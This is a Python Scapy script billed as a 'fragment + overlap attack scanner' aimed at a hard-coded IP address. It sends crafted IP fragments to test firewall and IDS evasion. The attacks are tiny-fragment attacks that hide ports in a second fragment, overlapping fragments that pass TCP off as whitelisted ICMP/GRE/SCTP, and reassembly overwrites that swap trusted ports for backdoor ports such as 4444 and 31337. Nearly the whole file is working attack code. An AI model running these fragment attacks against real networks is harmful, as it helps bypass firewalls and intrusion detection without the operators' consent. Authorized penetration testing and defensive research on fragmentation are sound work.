from scapy.all import *
from itertools import permutations, product
import os, sys

# ============================================================
#         FRAGMENT + OVERLAP ATTACK SCANNER v3
#         Run as: sudo python3 frag_scan.py
# ============================================================

target = "192.31.242.65"

# ===== ALL PARAMETERS — EDIT HERE =====

ttl_list          = [12,13,14,15,16,17,18,19,20]
tos_list          = [0x00]
payload_size_list = [1024]

# Fragment sizes — multiples of 8 only (RFC 791)
# Odd numbers auto-rounded down to nearest multiple of 8
fragment_size_list = [8]

# Fragment send orders — permutations of [0,1,2] index
# "all"   → test every permutation automatically
# or pick specific: [(0,1,2), (2,1,0), (1,0,2)]
fragment_order_mode = "custom"   # "all" or "custom"
fragment_order_custom = [(0,1,2), (2,1,0)]  # used only if mode="custom"

# ── PROTOCOL ARRAYS ─────────────────────────────────────────
# Whitelist = trusted/allowed protocols (used as F1 in overlap)
whitelist_protocols = {
    1: "ICMP",
    47:  "GRE",
    112: "VRRP",
    132: "SCTP",
   
}

# Forged = unexpected protocols (used as F2 in overlap)
forged_protocols = {
   
     6: "TCP"
}

# ── PAYLOAD OVERLAP PAIRS ───────────────────────────────────
# (F1_payload, F2_payload) — must differ at bytes 8-15
overlap_pairs = {
    "Null_vs_FF":  (b"\x00" * 48, b"\xff" * 48),
    "A_vs_B":      (b"\x41" * 48, b"\x42" * 48),
    "Zero_vs_SC":  (b"\x00" * 48, (b"\x90" * 4 + b"\xcc") * 10),
    "Inc_vs_Dec":  (bytes(range(48)), bytes(range(255, 207, -1))),
    "Fmt_vs_Null": (b"%x%x%x%x" * 6, b"\x00" * 48),
}

# ── PORT OVERLAP — ENABLE/DISABLE ───────────────────────────
# True  → Section 4C runs (TCP/UDP dest port overlap test)
# False → Section 4C skipped entirely (IP protocol overlap only)
enable_port_overlap = False

# ── PORT TRANSPORT PROTOCOL ──────────────────────────────────
# Which transport to use for port overlap test
# "TCP"  → proto=6  (TCP port overlap)
# "UDP"  → proto=17 (UDP port overlap)
# "both" → runs TCP then UDP
port_overlap_transport = "both"   # "TCP" | "UDP" | "both"

# ── WHITELIST PORTS (trusted — firewall sees these → ALLOW) ──
whitelist_ports = [
    21,    # FTP
    22,    # SSH
    25,    # SMTP
    53,    # DNS
    80,    # HTTP
    110,   # POP3
    123,   # NTP
    443,   # HTTPS
    3389,  # RDP
]

# ── FORGED PORTS (real dest — overwritten at reassembly) ─────
forged_ports = [
    4444,  # Metasploit default
    8080,  # HTTP-alt
    8443,  # HTTPS-alt
    9090,  # Common C2
    1337,  # Leet / backdoor
    31337, # Elite backdoor
    4000,  # ICQ / misc
    6666,  # IRC / misc
]

# Auto-generate port overlap pairs: whitelist × forged
# Each whitelist port paired with each forged port
# Set to None to use auto-generated pairs
# Or override manually: port_overlap_pairs = {"p80_vs_4444": (80, 4444)}
port_overlap_pairs = None   # None = auto from arrays above

# ── FRAGMENT MODE OPTIONS ────────────────────────────────────
# "NoFragment" → plain packet, no fragmentation (offline/normal mode)
# "Fragment"   → enable fragmentation
# You can have both — NoFragment runs plain, Fragment runs fragmented
fragment_mode_list = ["NoFragment", "Fragment"]

# ── IP OPTIONS ───────────────────────────────────────────────
ip_options_list = {
    "NoOption":  [],
}

# ============================================================
#  AUTO-GENERATE PROTOCOL OVERLAP PAIRS
#  whitelist (F1 trusted) × forged (F2 bypass)
# ============================================================
proto_overlap_pairs = {}
for (wk, wv), (fk, fv) in product(
        whitelist_protocols.items(),
        forged_protocols.items()):
    label = f"{wv}_vs_{fv.split()[0]}"
    proto_overlap_pairs[label] = (wk, wv, fk, fv)

# ============================================================
#  AUTO-GENERATE PORT OVERLAP PAIRS
#  whitelist_ports (F1 trusted) × forged_ports (F2 real)
# ============================================================
if enable_port_overlap:
    if port_overlap_pairs is None:
        port_overlap_pairs = {}
        for wp, fp in product(whitelist_ports, forged_ports):
            label = f"p{wp}_vs_p{fp}"
            port_overlap_pairs[label] = (wp, fp)

    # Build transport proto list from setting
    if port_overlap_transport == "TCP":
        port_transport_list = [(6, "TCP")]
    elif port_overlap_transport == "UDP":
        port_transport_list = [(17, "UDP")]
    else:  # "both"
        port_transport_list = [(6, "TCP"), (17, "UDP")]

# ============================================================
#  AUTO-ALIGN FRAGMENT SIZES (odd → round to multiple of 8)
# ============================================================
fragment_size_list = sorted(set(
    max(8, (f // 8) * 8) for f in fragment_size_list
))

# ============================================================
#  FRAGMENT ORDER BUILDER
# ============================================================
def get_frag_orders(n_frags):
    if fragment_order_mode == "all":
        return list(permutations(range(n_frags)))
    else:
        return [o for o in fragment_order_custom if max(o) < n_frags]

# ============================================================
#  ICMP DECODE MAP
# ============================================================
icmp_type_map = {
    0:  ("Echo Reply",        {0: "Echo Reply"}),
    3:  ("Dest Unreachable",  {
            0:  "Net Unreachable",
            1:  "Host Unreachable",
            2:  "Protocol Unreachable",
            3:  "Port Unreachable",
            4:  "Fragmentation Needed",
            5:  "Source Route Failed",
            9:  "Network Admin Prohibited",
            10: "Host Admin Prohibited",
            13: "Comm Admin Prohibited",
        }),
    4:  ("Source Quench",     {0: "Source Quench"}),
    5:  ("Redirect",          {0: "Redirect Network", 1: "Redirect Host"}),
    8:  ("Echo Request",      {0: "Echo Request"}),
    11: ("Time Exceeded",     {
            0: "TTL Exceeded in Transit",
            1: "Fragment Reassembly Exceeded",
        }),
    12: ("Parameter Problem", {
            0: "Pointer Error",
            1: "Missing Option",
            2: "Bad Length",
        }),
    13: ("Timestamp Req",     {0: "Timestamp Request"}),
    14: ("Timestamp Reply",   {0: "Timestamp Reply"}),
}

def decode_icmp(itype, icode):
    if itype in icmp_type_map:
        tname = icmp_type_map[itype][0]
        cname = icmp_type_map[itype][1].get(icode, f"Code-{icode}")
        return f"{tname} | {cname}"
    return f"ICMP Type={itype} Code={icode}"

def get_reply_info(reply):
    icmp_str   = "Non-ICMP Reply"
    extra_info = []
    if reply.haslayer(ICMP):
        icmp_str = decode_icmp(reply[ICMP].type, reply[ICMP].code)
    for opt in reply[IP].options:
        if hasattr(opt, 'routers'):
            ips = [str(i) for i in opt.routers if str(i) != '0.0.0.0']
            if ips:
                extra_info.append("RR:" + "->".join(ips))
        if hasattr(opt, 'timestamps') and opt.timestamps:
            extra_info.append(f"TS:{opt.timestamps}")
    return icmp_str, " | ".join(extra_info) if extra_info else "-"

def print_header(cols):
    print(f"  {cols[0]:>5} | {cols[1]:<20} | {cols[2]:>8} | {cols[3]:<16} | {cols[4]:<36} | {cols[5]}")
    print(f"  {'-'*5}-+-{'-'*20}-+-{'-'*8}-+-{'-'*16}-+-{'-'*36}-+-{'-'*25}")

def send_and_print(label, name, size_label, pkt):
    try:
        reply = sr1(pkt, timeout=1, retry=1, verbose=False)
        if reply:
            src            = reply[IP].src
            icmp_str, info = get_reply_info(reply)
            print(f"  {str(label):>5} | {name:<20} | {size_label:>8} | {src:<16} | {icmp_str:<36} | {info}")
        else:
            print(f"  {str(label):>5} | {name:<20} | {size_label:>8} | {'TIMEOUT':<16} | {'No Reply':<36} | -")
    except Exception as e:
        print(f"  {str(label):>5} | {name:<20} | {size_label:>8} | {'ERROR':<16} | {str(e)[:36]:<36} | -")

def send_plain(label, name, size_label, pkt):
    """NoFragment mode — send plain packet without fragmentation"""
    send_and_print(label, name, size_label, pkt)

def send_fragmented(frags_list, base_label, name, size_label):
    """Fragment mode — send frags in all/custom orders"""
    orders = get_frag_orders(len(frags_list))
    for order in orders:
        order_str = "->".join([f"F{i+1}" for i in order])
        for idx in order:
            f = frags_list[idx]
            off = f[IP].frag * 8
            send_and_print(
                f"F{idx+1}",
                f"{name}[{order_str}]",
                f"{off}B",
                f
            )

# ============================================================
#  ROOT CHECK
# ============================================================
if os.geteuid() != 0:
    print("[ERROR] Run as root: sudo python3 frag_scan.py")
    sys.exit(1)

print("\n" + "="*95)
print(f"  FRAGMENT + OVERLAP SCANNER v3 | Target: {target}")
print(f"  fragment_mode_list : {fragment_mode_list}")
print(f"  fragment_size_list : {fragment_size_list} (auto-aligned to x8)")
print(f"  fragment_order     : {fragment_order_mode}")
print(f"  proto_overlap_pairs: {len(proto_overlap_pairs)} (auto from whitelist x forged)")
print("="*95)

# ============================================================
#  SECTION 1: WHITELIST PROTOCOL — FRAG SIZE SWEEP
# ============================================================
print("\n" + "="*95)
print("  SECTION 1: WHITELIST PROTOCOL — FRAGMENT SIZE SWEEP")
print("="*95)

for frag_mode in fragment_mode_list:
    print(f"\n  [FragMode={frag_mode}]")
    for proto_num, proto_name in whitelist_protocols.items():
        for tos in tos_list:
            for ttl in ttl_list:
                tag = f"{proto_name}|ToS={hex(tos)}|TTL={ttl}|{frag_mode}"
                print(f"\n  [{tag}]")
                print_header(["Proto","Name","Offset","Reply From","ICMP Response","RR/TS Info"])

                if frag_mode == "NoFragment":
                    # Plain packet — normal mode, no fragmentation
                    pkt = IP(dst=target, ttl=ttl, tos=tos,
                             proto=proto_num) / Raw(load=b"\x41" * 64)
                    send_plain(proto_num, f"{proto_name}-plain", "64B", pkt)

                else:  # Fragment mode
                    for fsize in fragment_size_list:
                        payload = Raw(load=b"\x41" * (fsize * 2))
                        frags   = fragment(
                            IP(dst=target, ttl=ttl, tos=tos,
                               proto=proto_num) / payload,
                            fragsize=fsize
                        )
                        send_fragmented(frags, proto_num,
                                        f"{proto_name}-{fsize}B", f"{fsize}B")

# ============================================================
#  SECTION 2: FORGED PROTOCOL — FRAG SIZE SWEEP
# ============================================================
print("\n" + "="*95)
print("  SECTION 2: FORGED PROTOCOL — FRAGMENT SIZE SWEEP")
print("="*95)

for frag_mode in fragment_mode_list:
    print(f"\n  [FragMode={frag_mode}]")
    for proto_num, proto_name in forged_protocols.items():
        for tos in tos_list:
            for ttl in ttl_list:
                tag = f"{proto_name}|ToS={hex(tos)}|TTL={ttl}|{frag_mode}"
                print(f"\n  [{tag}]")
                print_header(["Proto","Name","Offset","Reply From","ICMP Response","RR/TS Info"])

                if frag_mode == "NoFragment":
                    pkt = IP(dst=target, ttl=ttl, tos=tos,
                             proto=proto_num) / Raw(load=b"\x42" * 64)
                    send_plain(proto_num, f"{proto_name}-plain", "64B", pkt)

                else:
                    for fsize in fragment_size_list:
                        payload = Raw(load=b"\x42" * (fsize * 2))
                        frags   = fragment(
                            IP(dst=target, ttl=ttl, tos=tos,
                               proto=proto_num) / payload,
                            fragsize=fsize
                        )
                        send_fragmented(frags, proto_num,
                                        f"{proto_name}-{fsize}B", f"{fsize}B")

# ============================================================
#  SECTION 3: TINY FRAGMENT ATTACK (RFC 1858)
# ============================================================
print("\n" + "="*95)
print("  SECTION 3: TINY FRAGMENT ATTACK (RFC 1858) — Port hidden in 2nd frag")
print("="*95)

for frag_mode in fragment_mode_list:
    print(f"\n  [FragMode={frag_mode}]")
    for proto_num, proto_name in whitelist_protocols.items():
        for ttl in ttl_list:
            for tos in tos_list:
                tag = f"{proto_name}|TTL={ttl}|ToS={hex(tos)}|{frag_mode}"
                print(f"\n  [{tag}]")
                print_header(["Frag","Name","Offset","Reply From","ICMP Response","RR/TS Info"])

                if frag_mode == "NoFragment":
                    # Plain mode: send complete TCP/UDP header (port visible)
                    pkt = IP(dst=target, ttl=ttl, tos=tos,
                             proto=proto_num) / Raw(load=b"\x00\x50\x00\x50" + b"\x00"*16)
                    send_plain("PL", f"{proto_name}-plain-port80", "20B", pkt)

                else:
                    # Tiny frag: F1=8B (no port), F2=port at offset 8
                    f1 = IP(dst=target, ttl=ttl, tos=tos, proto=proto_num,
                            flags="MF", frag=0) / Raw(load=b"\x00" * 8)
                    f2 = IP(dst=target, ttl=ttl, tos=tos, proto=proto_num,
                            flags=0,    frag=1) / Raw(load=b"\x00\x50\x00\x50" + b"\x00"*4)

                    frags = [f1, f2]
                    orders = get_frag_orders(len(frags))
                    for order in orders:
                        order_str = "->".join([f"F{i+1}" for i in order])
                        for idx in order:
                            f   = frags[idx]
                            off = f[IP].frag * 8
                            send_and_print(
                                f"F{idx+1}",
                                f"{proto_name}-Tiny[{order_str}]",
                                f"off={off}B",
                                f
                            )

# ============================================================
#  SECTION 4A: PAYLOAD OVERLAP ATTACK
# ============================================================
print("\n" + "="*95)
print("  SECTION 4A: PAYLOAD OVERLAP — F1(pay1) vs F2(pay2) reassembly conflict")
print("="*95)

for frag_mode in fragment_mode_list:
    print(f"\n  [FragMode={frag_mode}]")
    for olabel, (pay1, pay2) in overlap_pairs.items():
        for ttl in ttl_list:
            for tos in tos_list:
                tag = f"{olabel}|TTL={ttl}|ToS={hex(tos)}|{frag_mode}"
                print(f"\n  [{tag}]")
                print(f"  F1_zone={pay1[8:12].hex()} F2_zone={pay2[8:12].hex()} Conflict={pay1[8:16]!=pay2[8:16]}")
                print_header(["Frag","Label","Offset","Reply From","ICMP Response","RR/TS Info"])

                base1 = pay1[:48]
                base2 = pay2[:48]

                if frag_mode == "NoFragment":
                    # Plain mode: send F1 payload as single packet
                    pkt = IP(dst=target, ttl=ttl, tos=tos,
                             proto=1) / Raw(load=base1[:32])
                    send_plain("PL", f"{olabel}-plain", "32B", pkt)

                else:
                    f1 = IP(dst=target, ttl=ttl, tos=tos, proto=1,
                            flags="MF", frag=0) / Raw(load=base1[:16])
                    f2 = IP(dst=target, ttl=ttl, tos=tos, proto=1,
                            flags="MF", frag=1) / Raw(load=base2[8:24])
                    f3 = IP(dst=target, ttl=ttl, tos=tos, proto=1,
                            flags=0,    frag=2) / Raw(load=base2[16:32])

                    frags = [f1, f2, f3]
                    orders = get_frag_orders(len(frags))
                    for order in orders:
                        order_str = "->".join([f"F{i+1}" for i in order])
                        for idx in order:
                            f   = frags[idx]
                            off = f[IP].frag * 8
                            send_and_print(
                                f"F{idx+1}",
                                f"{olabel}[{order_str}]",
                                f"off={off}B",
                                f
                            )

# ============================================================
#  SECTION 4B: PROTOCOL OVERLAP ATTACK
#  Auto-generated from whitelist_protocols × forged_protocols
#  F1 = whitelist proto (trusted) | F2 = forged proto (bypass)
# ============================================================
print("\n" + "="*95)
print("  SECTION 4B: PROTOCOL OVERLAP — whitelist(F1) × forged(F2) auto-pairs")
print(f"  Total pairs: {len(proto_overlap_pairs)} (whitelist x forged arrays)")
print("="*95)

for frag_mode in fragment_mode_list:
    print(f"\n  [FragMode={frag_mode}]")
    for plabel, (p1, p1n, p2, p2n) in proto_overlap_pairs.items():
        for ttl in ttl_list:
            for tos in tos_list:
                tag = f"{plabel}|TTL={ttl}|ToS={hex(tos)}|{frag_mode}"
                print(f"\n  [{tag}]")
                print(f"  F1.proto={p1}({p1n}) TRUSTED | F2.proto={p2}({p2n}) FORGED | bypass!")
                print_header(["Frag","Label","Offset","Reply From","ICMP Response","RR/TS Info"])

                base1 = b"\x41" * 48
                base2 = b"\x42" * 48

                if frag_mode == "NoFragment":
                    # Plain mode: send trusted proto only (baseline)
                    pkt = IP(dst=target, ttl=ttl, tos=tos,
                             proto=p1) / Raw(load=base1[:32])
                    send_plain("PL", f"{p1n}-plain", "32B", pkt)

                else:
                    # F1 = whitelist proto (firewall sees this → ALLOW)
                    f1 = IP(dst=target, ttl=ttl, tos=tos, proto=p1,
                            flags="MF", frag=0) / Raw(load=base1[:16])
                    # F2 = forged proto (IDS/reassembler confusion)
                    f2 = IP(dst=target, ttl=ttl, tos=tos, proto=p2,
                            flags="MF", frag=1) / Raw(load=base2[8:24])
                    # F3 = forged proto final
                    f3 = IP(dst=target, ttl=ttl, tos=tos, proto=p2,
                            flags=0,    frag=2) / Raw(load=base2[16:32])

                    frags = [f1, f2, f3]
                    orders = get_frag_orders(len(frags))
                    for order in orders:
                        order_str = "->".join([f"F{i+1}" for i in order])
                        for idx in order:
                            f   = frags[idx]
                            off = f[IP].frag * 8
                            send_and_print(
                                f"F{idx+1}",
                                f"{plabel}[{order_str}]",
                                f"off={off}B",
                                f
                            )

# ============================================================
#  SECTION 4C: DEST PORT OVERLAP ATTACK (OPTIONAL)
#  Runs only when enable_port_overlap = True
#  Uses: whitelist_ports × forged_ports (auto-paired)
#  Transport: TCP / UDP / both (set via port_overlap_transport)
# ============================================================
if not enable_port_overlap:
    print("\n" + "="*95)
    print("  SECTION 4C: DEST PORT OVERLAP — SKIPPED (enable_port_overlap=False)")
    print("  → Only IP protocol overlap (Section 4B) is active")
    print("="*95)
else:
    print("\n" + "="*95)
    print("  SECTION 4C: DEST PORT OVERLAP — F1 trusted port → F2 overwrites")
    print(f"  whitelist_ports : {whitelist_ports}")
    print(f"  forged_ports    : {forged_ports}")
    print(f"  total pairs     : {len(port_overlap_pairs)} (whitelist x forged auto-pairs)")
    print(f"  transport       : {port_overlap_transport}")
    print("="*95)

    for frag_mode in fragment_mode_list:
        print(f"\n  [FragMode={frag_mode}]")

        for proto_num, proto_name in port_transport_list:
            print(f"\n  [Transport={proto_name}({proto_num})]")

            for portlabel, (dp1, dp2) in port_overlap_pairs.items():
                for ttl in ttl_list:
                    for tos in tos_list:
                        tag = f"{proto_name}|{portlabel}|TTL={ttl}|ToS={hex(tos)}|{frag_mode}"
                        print(f"\n  [{tag}]")
                        print(f"  F1.dport={dp1}(trusted→ALLOW) | F2.dport={dp2}(real→bypass!)")
                        print_header(["Frag","Label","dport","Reply From","ICMP Response","RR/TS Info"])

                        # Build transport header bytes (first 8 bytes)
                        # TCP/UDP share same sport/dport layout at bytes 0-3
                        if proto_num == 6:   # TCP
                            hdr_f1 = bytes(TCP(sport=1234, dport=dp1))[:8]
                            hdr_f2 = bytes(TCP(sport=1234, dport=dp2))[:8]
                        else:                # UDP
                            hdr_f1 = bytes(UDP(sport=1234, dport=dp1))[:8]
                            hdr_f2 = bytes(UDP(sport=1234, dport=dp2))[:8]

                        if frag_mode == "NoFragment":
                            # Plain baseline — send real dport directly
                            pkt = IP(dst=target, ttl=ttl, tos=tos,
                                     proto=proto_num) / Raw(load=hdr_f2)
                            send_plain("PL", f"{proto_name}-plain-dp{dp2}", f"dp{dp2}", pkt)

                        else:
                            # F1: frag=0 MF=1 — trusted dport (firewall sees)
                            f1 = IP(dst=target, ttl=ttl, tos=tos,
                                    proto=proto_num,
                                    flags="MF", frag=0) / Raw(load=hdr_f1)

                            # F2: frag=0 MF=0 — SAME offset, real dport overwrites
                            # Last-write-wins → dp2 replaces dp1 at reassembly
                            f2 = IP(dst=target, ttl=ttl, tos=tos,
                                    proto=proto_num,
                                    flags=0,    frag=0) / Raw(load=hdr_f2)

                            frags  = [f1, f2]
                            dports = [dp1, dp2]
                            orders = get_frag_orders(len(frags))
                            for order in orders:
                                order_str = "->".join([f"F{i+1}" for i in order])
                                for idx in order:
                                    f = frags[idx]
                                    send_and_print(
                                        f"F{idx+1}",
                                        f"{proto_name}-{portlabel}[{order_str}]",
                                        f"dp{dports[idx]}",
                                        f
                                    )

# ============================================================
#  SECTION 5: IP OPTION + FRAGMENT + PAYLOAD SIZE COMBO
# ============================================================
print("\n" + "="*95)
print("  SECTION 5: IP OPTION + FRAGMENT + PAYLOAD SIZE COMBO")
print("="*95)

for frag_mode in fragment_mode_list:
    print(f"\n  [FragMode={frag_mode}]")
    for opt_name, opt_value in ip_options_list.items():
        for proto_num, proto_name in whitelist_protocols.items():
            for ttl in ttl_list:
                for tos in tos_list:
                    for psize in payload_size_list:
                        tag = f"Opt={opt_name}|{proto_name}|TTL={ttl}|ToS={hex(tos)}|{psize}B|{frag_mode}"
                        print(f"\n  [{tag}]")
                        print_header(["Proto","Name","Offset","Reply From","ICMP Response","RR/TS Info"])

                        if frag_mode == "NoFragment":
                            # Plain packet — no fragmentation
                            payload = Raw(load=b"\x41" * max(psize, 8))
                            pkt = IP(dst=target, ttl=ttl, tos=tos,
                                     proto=proto_num,
                                     options=opt_value) / payload
                            send_plain(proto_num, f"{proto_name}-plain", f"{psize}B", pkt)

                        else:
                            if psize == 0:
                                pkt = IP(dst=target, ttl=ttl, tos=tos,
                                         proto=proto_num,
                                         options=opt_value) / Raw(load=b"")
                                send_plain(proto_num, f"{proto_name}-plain", "0B", pkt)
                                continue
                            try:
                                payload = Raw(load=b"\x41" * psize)
                                frags   = fragment(
                                    IP(dst=target, ttl=ttl, tos=tos,
                                       proto=proto_num,
                                       options=opt_value) / payload,
                                    fragsize=64
                                )
                                send_fragmented(frags, proto_num,
                                                f"{proto_name}-{opt_name}", f"{psize}B")
                            except Exception as e:
                                print(f"  ERROR: {e}")
